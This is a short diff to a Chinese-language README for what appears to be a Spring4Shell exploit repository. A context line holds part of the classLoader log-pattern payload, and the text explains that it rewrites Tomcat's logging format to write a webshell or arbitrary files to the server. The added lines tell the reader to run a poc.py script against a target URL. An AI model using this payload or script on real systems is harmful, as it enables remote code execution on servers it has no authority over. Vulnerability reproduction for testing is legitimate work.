@@ -25,3 +25,9 @@ class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc
 
 如果路径可控，通过变换payload 你可以写入任意你需要的文件  
 主要是通过修改tomcat 日志记录格式，以日志的形式写入shell
+
+### poc 使用
+方便复现方式，直接使用下面的[poc](./poc/poc.py) 即可
+```shell
+python3 poc.py http://test.com/hello
+```
